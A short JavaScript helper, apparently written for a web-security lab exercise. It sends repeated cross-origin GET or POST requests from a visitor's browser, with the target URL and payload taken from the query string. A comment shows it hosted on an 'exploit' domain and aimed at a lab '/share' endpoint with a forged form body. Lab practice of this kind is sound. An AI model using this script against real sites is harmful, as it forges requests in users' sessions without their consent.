//XMLHttpRequest
//http://exploit.germanywestcentral.cloudapp.azure.com/xhr.html?action=POST&payload=user%3daaa%26id%3d0&n=2&url=http://ptl-6e44eb26-6df8ebfa.libcurl.so/share

function retrieve(url){
  return new Promise((resolve,reject) => {
    const xhr = new XMLHttpRequest();
    xhr.onload = () => resolve(xhr.response);
    xhr.onerror = () => reject("request failed"+ xhr.response)
    xhr.open('GET',url,true)
    xhr.send()

});
}
function post(url,payload){
  return new Promise((resolve,reject) => {
    const xhr = new XMLHttpRequest();
    xhr.onload = () => resolve(xhr.response);
    xhr.onerror = () => reject("request failed"+ xhr.response)
    xhr.open('POST',url,true)
    xhr.setRequestHeader("Content-Type", "plain/text");
    
    xhr.send(payload)

});
};

const n= getAllUrlParams().n||1
const url = getAllUrlParams().url || 'https://random.dog/woof.json'
const action = getAllUrlParams().action || 'get'
const payload = decodeURIComponent(getAllUrlParams().payload) || ''
console.log(n,url,action,payload)
async function asyncTask(){

  if (action == 'get')
  {
    for (let i=0; i<n; i++){
      console.log(i+1);
      console.log(await retrieve(url));
    }
  }

  if (action == 'post')
  {
    for (let i=0; i<n; i++){
      console.log(i+1);
      console.log(await post(url,payload));
    }
  }

}
asyncTask();